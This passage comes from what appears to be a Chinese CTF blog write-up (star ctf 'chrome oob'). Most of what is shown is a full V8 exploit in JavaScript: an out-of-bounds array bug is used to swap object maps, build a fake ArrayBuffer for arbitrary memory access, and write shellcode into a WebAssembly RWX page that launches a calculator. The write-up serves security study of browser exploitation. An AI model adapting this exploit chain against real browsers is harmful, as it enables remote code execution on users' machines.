data.BYTES_PER_ELEMENT !== &apos;undefined&apos;)</span><br><span class="line">        data = Array.from(data);</span><br><span class="line"></span><br><span class="line">    var lines = [];</span><br><span class="line">        var chunk = data.slice(i, i+16);</span><br><span class="line">    for (var i = 0; i &lt; data.length; i += 16) &#123;</span><br><span class="line">        var parts = chunk.map(hex);</span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line">            parts.splice(8, 0, &apos; &apos;);</span><br><span class="line">        lines.push(parts.join(&apos; &apos;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return lines.join(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simplified version of the similarly named python module.</span><br><span class="line">var Struct = (function() &#123;</span><br><span class="line">    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span><br><span class="line">    var buffer      = new ArrayBuffer(8);</span><br><span class="line">    var byteView    = new Uint8Array(buffer);</span><br><span class="line">    var uint32View  = new Uint32Array(buffer);</span><br><span class="line">    var float64View = new Float64Array(buffer);</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        pack: function(type, value) &#123;</span><br><span class="line">            var view = type;        // See below</span><br><span class="line">            view[0] = value;</span><br><span class="line">            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: function(type, bytes) &#123;</span><br><span class="line">            if (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                throw Error(&quot;Invalid bytearray&quot;);</span><br><span class="line"></span><br><span class="line">            var view = type;        // See below</span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            return view[0];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // Available types.</span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">function Int64(v) &#123;</span><br><span class="line">    // The underlying byte array.</span><br><span class="line">    var bytes = new Uint8Array(8);</span><br><span class="line"></span><br><span class="line">    switch (typeof v) &#123;</span><br><span class="line">        case &apos;number&apos;:</span><br><span class="line">            v = &apos;0x&apos; + Math.floor(v).toString(16);</span><br><span class="line">        case &apos;string&apos;:</span><br><span class="line">            if (v.startsWith(&apos;0x&apos;))</span><br><span class="line">                v = v.substr(2);</span><br><span class="line">            if (v.length % 2 == 1)</span><br><span class="line">                v = &apos;0&apos; + v;</span><br><span class="line"></span><br><span class="line">            var bigEndian = unhexlify(v, 8);</span><br><span class="line">            //print(bigEndian.toString());</span><br><span class="line">            bytes.set(Array.from(bigEndian).reverse());</span><br><span class="line">            break;</span><br><span class="line">        case &apos;object&apos;:</span><br><span class="line">            if (v instanceof Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (v.length != 8)</span><br><span class="line">                    throw TypeError(&quot;Array must have excactly 8 elements.&quot;);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case &apos;undefined&apos;:</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            throw TypeError(&quot;Int64 constructor requires an argument.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Return a double whith the same underlying bit representation.</span><br><span class="line">    this.asDouble = function() &#123;</span><br><span class="line">        // Check for NaN</span><br><span class="line">        if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a double&quot;);</span><br><span class="line"></span><br><span class="line">        return Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return a javascript value with the same underlying bit representation.</span><br><span class="line">    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span><br><span class="line">    // due to double conversion constraints.</span><br><span class="line">    this.asJSValue = function() &#123;</span><br><span class="line">        if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a JSValue&quot;);</span><br><span class="line"></span><br><span class="line">        // For NaN-boxing, JSC adds 2^48 to a double value&apos;s bit pattern.</span><br><span class="line">        this.assignSub(this, 0x1000000000000);</span><br><span class="line">        var res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        this.assignAdd(this, 0x1000000000000);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the underlying bytes of this number as array.</span><br><span class="line">    this.bytes = function() &#123;</span><br><span class="line">        return Array.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the byte at the given index.</span><br><span class="line">    this.byteAt = function(i) &#123;</span><br><span class="line">        return bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the value of this number as unsigned hex string.</span><br><span class="line">    this.toString = function() &#123;</span><br><span class="line">        //print(&quot;toString&quot;);</span><br><span class="line">        return &apos;0x&apos; + hexlify(Array.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Basic arithmetic.</span><br><span class="line">    // These functions assign the result of the computation to their &apos;this&apos; object.</span><br><span class="line"></span><br><span class="line">    // Decorator for Int64 instance operations. Takes care</span><br><span class="line">    // of converting arguments to Int64 instances if required.</span><br><span class="line">    function operation(f, nargs) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            if (arguments.length != nargs)</span><br><span class="line">                throw Error(&quot;Not enough arguments for function &quot; + f.name);</span><br><span class="line">            for (var i = 0; i &lt; arguments.length; i++)</span><br><span class="line">                if (!(arguments[i] instanceof Int64))</span><br><span class="line">                    arguments[i] = new Int64(arguments[i]);</span><br><span class="line">            return f.apply(this, arguments);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this = -n (two&apos;s complement)</span><br><span class="line">    this.assignNeg = operation(function neg(n) &#123;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        return this.assignAdd(this, Int64.One);</span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line">    // this = a + b</span><br><span class="line">    this.assignAdd = operation(function add(a, b) &#123;</span><br><span class="line">        var carry = 0;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    // this = a - b</span><br><span class="line">    this.assignSub = operation(function sub(a, b) &#123;</span><br><span class="line">        var carry = 0;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    // this = a &amp; b</span><br><span class="line">    this.assignAnd = operation(function and(a, b) &#123;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Constructs a new Int64 instance with the same bit representation as the provided double.</span><br><span class="line">Int64.fromDouble = function(d) &#123;</span><br><span class="line">    var bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    return new Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// Convenience functions. These allocate a new Int64 to hold the result.</span><br><span class="line"></span><br><span class="line">// Return -n (two&apos;s complement)</span><br><span class="line">function Neg(n) &#123;</span><br><span class="line">    return (new Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a + b</span><br><span class="line">function Add(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a - b</span><br><span class="line">function Sub(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a &amp; b</span><br><span class="line">function And(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hex(a) &#123;</span><br><span class="line">    if (a == undefined) return &quot;0xUNDEFINED&quot;;</span><br><span class="line">    var ret = a.toString(16);</span><br><span class="line">    if (ret.substr(0,2) != &quot;0x&quot;) return &quot;0x&quot;+ret;</span><br><span class="line">    else return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function lower(x) &#123;</span><br><span class="line">    // returns the lower 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upper(x) &#123;</span><br><span class="line">    // returns the upper 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function lowerint(x) &#123;</span><br><span class="line">    // returns the lower 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upperint(x) &#123;</span><br><span class="line">    // returns the upper 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function combine(a, b) &#123;</span><br><span class="line">    //a = a &gt;&gt;&gt; 0;</span><br><span class="line">    //b = b &gt;&gt;&gt; 0;</span><br><span class="line">    //print(a.toString());</span><br><span class="line">    //print(b.toString());</span><br><span class="line">    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//padLeft用于字符串左补位</span><br><span class="line"></span><br><span class="line">function combineint(a, b) &#123;</span><br><span class="line">    //a = a &gt;&gt;&gt; 0;</span><br><span class="line">    //b = b &gt;&gt;&gt; 0;</span><br><span class="line">    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  // based on Long.js by dcodeIO</span><br><span class="line">  // https://github.com/dcodeIO/Long.js</span><br><span class="line">  // License Apache 2</span><br><span class="line">  class _u64 &#123;</span><br><span class="line">     constructor(hi, lo) &#123;</span><br><span class="line">        this.lo_ = lo;</span><br><span class="line">        this.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        var hlo = (this.lo_ &lt; 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)</span><br><span class="line">        var hhi = (this.hi_ &lt; 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)</span><br><span class="line">        if(hlo.substr(0,2) == &quot;0x&quot;) hlo = hlo.substr(2,hlo.length);</span><br><span class="line">        if(hhi.substr(0,2) == &quot;0x&quot;) hhi = hhi.substr(2,hji.length);</span><br><span class="line">        hlo = &quot;00000000&quot; + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length-8, hlo.length);</span><br><span class="line">        return &quot;0x&quot; + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        return this.hi_ == 0 &amp;&amp; this.lo_ == 0;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        return this.hi_ == val.hi_ &amp;&amp; this.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        return new _u64(this.hi_ &amp; val.hi_, this.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        var a48 = this.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a32 = this.hi_ &amp; 0xFFFF;</span><br><span class="line">        var a16 = this.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a00 = this.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var b48 = val.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b32 = val.hi_ &amp; 0xFFFF;</span><br><span class="line">        var b16 = val.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b00 = val.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var c48 = 0, c32 = 0, c16 = 0, c00 = 0;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; 16;</span><br><span class="line">        c00 &amp;= 0xFFFF;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; 16;</span><br><span class="line">        c16 &amp;= 0xFFFF;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; 16;</span><br><span class="line">        c32 &amp;= 0xFFFF;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        return new _u64((c48 &lt;&lt; 16) | c32, (c16 &lt;&lt; 16) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        return this.add(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        return this.sub(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        return new _u64(~this.hi_, ~this.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        return this.not().add(new _u64(0,1));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        return this.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        return ((val &amp; 0xFF) &lt;&lt; 24) | ((val &amp; 0xFF00) &lt;&lt; 8) |</span><br><span class="line">              ((val &gt;&gt; 8) &amp; 0xFF00) | ((val &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        var lo = swap32(this.lo_);</span><br><span class="line">        var hi = swap32(this.hi_);</span><br><span class="line">        return new _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">var u64 = function(hi, lo) &#123; return new _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line">function gc()&#123;</span><br><span class="line">    for (var i = 0; i &lt; 1024 * 1024 * 16; i++)&#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasm_code = new Uint8Array([</span><br><span class="line">    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,</span><br><span class="line">    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,</span><br><span class="line">    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,</span><br><span class="line">    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x41, 0x00, 0x0b</span><br><span class="line">  ]);</span><br><span class="line">  const wasm_instance = new WebAssembly.Instance(</span><br><span class="line">    new WebAssembly.Module(wasm_code));</span><br><span class="line">  const wasm_func = wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line">var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">var fake_arraybuffer = [</span><br><span class="line">    //map|properties</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    //elements|length</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1000).asDouble(),</span><br><span class="line">    //backingstore|0x2</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x2).asDouble(),</span><br><span class="line">    //padding</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    //fake map</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1900042319080808).asDouble(),</span><br><span class="line">    new Int64(0x00000000082003ff).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">].splice(0);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">// %DebugPrint(fake_arraybuffer);</span><br><span class="line"></span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var a = [1.1, 1.1, 1.1, 1.1,1.1];</span><br><span class="line">var b = [fake_arraybuffer, wasm_instance, ab, 2.2, 2.2];</span><br><span class="line">var c = [3.3, 3.3, 3.3, 3.3, 3.3];</span><br><span class="line">//布局内存，让array连续存放</span><br><span class="line">a = a.splice(0);</span><br><span class="line">b = b.splice(0);</span><br><span class="line">c = c.splice(0);</span><br><span class="line"></span><br><span class="line">// leak出double/object array的map</span><br><span class="line">// print(&quot;0x&quot; + Int64.fromDouble(a.oob()).toString(16));</span><br><span class="line">// print(new Int64(Int64.fromDouble(a.oob())).asDouble());</span><br><span class="line">double_map = a.oob();</span><br><span class="line">console.log(&quot;doube map is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(double_map).toString(16));</span><br><span class="line">console.log(&quot;object map is:&quot;);</span><br><span class="line">object_map = b.oob();</span><br><span class="line">console.log(Int64.fromDouble(object_map).toString(16));</span><br><span class="line"></span><br><span class="line">//覆盖object array的map为double,于是可以通过b来leak</span><br><span class="line">b.oob(double_map);</span><br><span class="line"></span><br><span class="line">fake_arraybuffer_obj = b[0];</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_obj).toString(16));</span><br><span class="line">// %DebugPrint(fake_arraybuffer);</span><br><span class="line">fake_arraybuffer_elem = fake_arraybuffer_obj + new Int64(0xc70).asDouble();//这个偏移需要适配</span><br><span class="line">console.log(&quot;fake_arraybuffer addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_elem).toString(16));</span><br><span class="line">console.log(&quot;fake_arraybuffer map is:&quot;);</span><br><span class="line">fake_arraybuffer_map = fake_arraybuffer_elem + new Int64(0x40).asDouble();</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_map).toString(16));</span><br><span class="line">fake_arraybuffer[0] = fake_arraybuffer_map;</span><br><span class="line"></span><br><span class="line">// %DebugPrint(wasm_instance);</span><br><span class="line">console.log(&quot;wasm_instance is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(b[1]).toString(16));</span><br><span class="line">locate_rwx_addr = b[1] + new Int64(0x88 - 0x1).asDouble();</span><br><span class="line">fake_arraybuffer[4] = locate_rwx_addr;</span><br><span class="line"></span><br><span class="line">var d = [fake_arraybuffer_elem, 1.1, 1.1];</span><br><span class="line">d.oob(object_map);</span><br><span class="line">var dv = new DataView(d[0]);</span><br><span class="line">console.log(&quot;fake_arraybuffer done&quot;);</span><br><span class="line">// %DebugPrint(dv);</span><br><span class="line">rwx_addr = dv.getFloat64(0, true);</span><br><span class="line">console.log(&quot;rwx addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(rwx_addr).toString(16));</span><br><span class="line">fake_arraybuffer[4] = rwx_addr;</span><br><span class="line">for (i = 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    dv.setUint32(i * 4, shellcode[i], true);</span><br><span class="line">&#125;</span><br><span class="line">wasm_func();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>测试机器ubuntu16.04<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/19/justintime/" rel="next" title="Google CTF justintime exploit">
+                <i class="fa fa-chevron-left"></i> Google CTF justintime exploit
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/29/CVE-2016-5198/" rel="prev" title="case study:cve-2016-5198">
+                case study:cve-2016-5198 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/sakura_heart.png"
+                alt="sakura" />
+            
+              <p class="site-author-name" itemprop="name">sakura</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">99</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dwfault-blog.imwork.net:30916/" title="dwfalut" target="_blank">dwfalut</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.auxy.xyz" title="Auxy" target="_blank">Auxy</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#star-ctf-chrome-oob-writeup"><span class="nav-number">1.</span> <span class="nav-text">star ctf chrome oob writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bug"><span class="nav-number">1.1.</span> <span class="nav-text">bug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.2.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trick"><span class="nav-number">1.3.</span> <span class="nav-text">trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#splice"><span class="nav-number">1.3.1.</span> <span class="nav-text">splice</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gc"><span class="nav-number">1.3.2.</span> <span class="nav-text">gc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#debug"><span class="nav-number">1.3.3.</span> <span class="nav-text">debug</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sakura</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
